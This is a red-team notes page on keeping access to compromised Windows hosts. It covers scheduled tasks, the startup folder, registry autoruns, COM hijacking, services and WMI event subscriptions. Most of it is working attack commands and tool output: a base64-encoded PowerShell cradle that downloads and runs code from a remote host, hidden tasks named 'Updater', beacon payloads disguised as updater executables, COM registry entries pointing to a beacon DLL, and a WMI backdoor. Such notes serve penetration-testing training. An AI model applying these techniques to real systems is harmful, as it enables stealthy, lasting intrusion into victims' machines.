---
title: Host Persistence
category: Red Team
order: 5
---

Persistence is the method of maintaining access to a compromised machine. Is useful to avoid exploiting the initial compromise steps all over again.

Workstations are frequently rebooted

If the initial access is obtained though a phishing campaign, and if the current beacon is lost, it could be end of the engagement. 

Install persistence usually involves making some configuration change or dropping a payload to disk, which is why they can carry a high risk of detection.

> **Note**: You must strike a delicate balance of keeping the operation going and getting caught.


# Userland Persistence

Userland persistence involves persistence that can be executed as the current user environment.

Common userland persistence methods are:

* Scheduled Tasks
* Startup Folder
* HKCU / HKLM Registry Autoruns

`SharPersist` is .NET windows persistence toolkit assembly  written by FireEye very useful to make a persistence.

* [https://github.com/mandiant/SharPersist](https://github.com/mandiant/SharPersist)

| **Parameter** |           **Description**          | **Values**                                                                                |
|:-------------:|:----------------------------------:|-------------------------------------------------------------------------------------------|
|       -t      |       Persistence technique        | `keepass`, `reg`, `schtaskbackdoor`, `startupfolder`, `tortoisesvn`, `service`, `schtask` |
|       -c      |         Command to execute         | Ex: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`                           |
|       -a      |      Arguments for the command     | Ex: `-nop -w hidden -enc SQBF....A==`                                                     |
|       -n      |          Name of the task          | Ex: `Updater`                                                                             |
|       -m      |           To add the task          | `add`, `remove`, `check`, `list`                                                          |
|       -o      |           Task frequency           | `env`, `hourly`, `daily`, `logon`                                                         |
|       -f      |          Filename to save          | Ex: `UserEnvSetup`                                                                        |
|       -k      |       Registry key to modify       | Ex: `hkcurun`                                                                             |
|       -v      | Name of the registry key to create | Ex: `Updated`                                                                             |

## Scheduled Tasks

The Windows Task Scheduler allows us to create tasks that execute on a pre-determined trigger. That trigger could be a day, when users logon, when the computer goes idle, when its locked and more over.

In order to avoid problems of quotations in the IEX cradle, we can encode it in base64 and use the `-EncodedCommand` or `-enc` parameter.

> **Note**: Use `Unicode` enconding instead of `UTF8` or `ASCII` at base64 conversion.

In PowerShell:

```powershell
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
```
In Bash:

```bash
kali@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.10.10/a"))'
kali@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
```

Finally we can use `SharPersist` to create a scheduled task.

```
beacon> execute-assembly .\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly
[+] SUCCESS: Scheduled task added
```

## Startup Folder

Applications, files and shortcuts within a user's startup folder are launched automatically when they first log in. It's commonly used to bootstrap the user's home environment (set wallpapers, shortcut's etc). 

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup
[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: B34647F8D8B7CE28C1F0DA3FF444D9B7244C41370B88061472933B2607A169BC
```

> **Note**: In `System` context this tecnhique does not work.

## HKCU / HKLM Registry Autoruns

AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

* **HKCU**: HKCU autorun will only trigger when the **owner of the hive logs** into the machine.
* **HKLM**: HKLM autorun will trigger when **any user logs** in the machine.

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\beacon-http.exe
beacon> mv beacon-http.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

> **Note**: It's a common misconception that an HKLM autorun will execute the payload as SYSTEM, it will still run under the context of the user's account.

## COM Hijacking

Component Object Model (COM) is a technology built within the Windows operating system that allows intercommunication between software components of different languages.

COMs are identified with a classID `CLSID` and each component exposes functionality via one or more interfaces `IIDs`. 
A COM Class `COCLASS` is an implementation of one or more interfaces, represented by their `CLSID` or a programmatic identifier `ProgID`.

COM Classes and interfaces are defined in the registry `HKEY_CLASSES_ROOT\CLSID` and `HKEY_CLASSES_ROOT\Interface`.

An in-processs server allows the specified DLL to be loaded into the process of the calling application. `InProcServer32` registers a 32-bit in-process server.

The `ThreadingModel` can be `Apartment` (Single-Threaded), `Free`(Multi-Threaded), `Both` (Single or Multi) or `Neutral` (Thread Neutral).

It is possible to find `LocalServer32` wich provides a path to an EXE file.

`OleView .NET` is a tool that allows us to find and inspect COM components.

* [https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)


**COM Hijacking** is possible when we are able to modify these entries to point to a different DLL. It is important to notice that when an application attempts to locate an object, there is a search order that it goes through. First search `HKEY_CURRENT_USER (HKCU)` and after that `HKEY_LOCAL_MACHINE (HKLM)`.

So if a COM Object is located within `HKLM`, we can place a duplicate entry into `HKCU` which will be executed first.

> **Note**: `BE CAREFUL` we can break the functionlity of an application or maybe the whole OS.

### Abandoned Keys

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications that are trying to load objects that don't actually exist, it's called `abandoned keys`.

We are going to use Process Monitor `procmon64.exe` of SysInternals. Due to the high amount of that will be captured, we need to apply a filter.

![](/hackingnotes/images/procmon.png)


Add the following filters and disable the current ones:

* Operation is `RegOpenKey`
* Result is `NAME NOT FOUND`
* Path ends with `InprocServer32`

![](/hackingnotes/images/procmon-results.png)


> **Note**: Use one that is loaded semi-frequently, hijack one that is loaded every couple of seconds would be noisy and rough.


We can use powershell to check that the entry does exist in `HKLM`, but not in `HKCU`.

```
PS C:\> Get-Item -Path "HKLM:Software\Classes\WOW6432Node\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32"

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\WINDOWS\system32\wbem\wbemprox.dll
                               ThreadingModel : Both


PS C:\> Get-Item -Path "HKCU:Software\Classes\WOW6432Node\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32"
Get-Item : Cannot find path
'HKCU:\Software\Classes\WOW6432Node\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32' porque no existe.
```

In order to exploit this, we need to create the necessary registry entries in `HKCU` and point them to our Beacon DLL.

```
New-Iten -Path "HKCU:Software\Classes\WOW6432Node\CLSID" -Name "{4590F811-1D3A-11D0-891F-00AA004B2E24}"
New-Item -Path "HKCU:Software\Classes\WOW6432Node\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}" -Name "InprocServer32" -Value "C:\Windows\Temp\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\WOW6432Node\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackeable COM components in Task Scheduler

Task Scheduler is another great place to look for hijackeble COM components. We can use the following script of powershell to find compatible tasks.

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

We can lookup the current implementation of a component in `HKEY_CLASSES_ROOT\CLSID`.

```
PS C:\> Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
               ThreadingModel : Both
```

And we can check if the `InprocServer32` is currently implemented in `HKLM` and not in `HKCU`.

```
PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA} (default) : MsCtfMonitor task handler


PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCAAA}' because it does not exist.
```

# Elevated Persistence

We can also add persistence mechanisms to mantain `SYSTEM` access.

> **Note**: SYSTEM processes cannot authenticate to a web proxy, so we can't use HTTP Beacones, use P2P or DNS Beacons instead.

## Windows Services

We can create our own service with `AUTO_START` with `SharpPersist`.

```
beacon> upload C:\Payloads\dns-svc.exe
beacon> execute-assembly .\SharpPersist.exe -t service -c "C:\Windows\dns-svc.exe" -n "dns-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\dns-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: dns-svc

[+] SUCCESS: Service persistence added
```

This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START, which means that whe service won't run until the machine is rebooted.

## WMI Event Subscriptions

Persistence via WMI events can be achieved by leveraging the following three classes:

* **EventCostumer**: Is the action that we want to perform (execute a payload).
* **EventFilter**: The trigger that we can act upon.
* **FilterToConsumerBinding**: Links an EventCostumer and EventFilter together.

`PowerLuk` is a PowerShell tool for building these WMI queries.

* [https://github.com/Sw4mpf0x/PowerLurk](https://github.com/Sw4mpf0x/PowerLurk)

```
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import .\PowerLuk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermamentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

You can view these classes with:

```powershell
Get-WmiEvent -Name WmiBackdoor
```
We can remove the backdoor with:

```powershell
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```